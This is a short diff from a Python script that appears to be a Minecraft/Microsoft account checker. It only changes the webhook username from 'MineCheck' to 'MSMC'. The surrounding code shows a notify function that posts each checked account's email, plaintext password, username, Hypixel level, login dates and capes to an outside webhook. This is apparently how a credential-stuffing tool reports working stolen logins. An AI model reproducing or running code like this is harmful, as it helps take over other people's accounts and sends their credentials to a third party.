@@ -81,7 +81,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
 
 def notify(email, password, name, hypixel, level, firstlogin, lastlogin, cape, capes):
     global errors
-    try: requests.post(webhook, data=json.dumps({"content": webhook_message.replace("<email>", email).replace("<password>", password).replace("<name>", name).replace("<hypixel>", hypixel).replace("<level>", level).replace("<firstlogin>", firstlogin).replace("<lastlogin>", lastlogin).replace("<ofcape>", cape).replace("<capes>", capes), "username" : "MineCheck"}), headers={"Content-Type": "application/json"})
+    try: requests.post(webhook, data=json.dumps({"content": webhook_message.replace("<email>", email).replace("<password>", password).replace("<name>", name).replace("<hypixel>", hypixel).replace("<level>", level).replace("<firstlogin>", firstlogin).replace("<lastlogin>", lastlogin).replace("<ofcape>", cape).replace("<capes>", capes), "username" : "MSMC"}), headers={"Content-Type": "application/json"})
     except: errors+=1
 
 def hypixel(name):
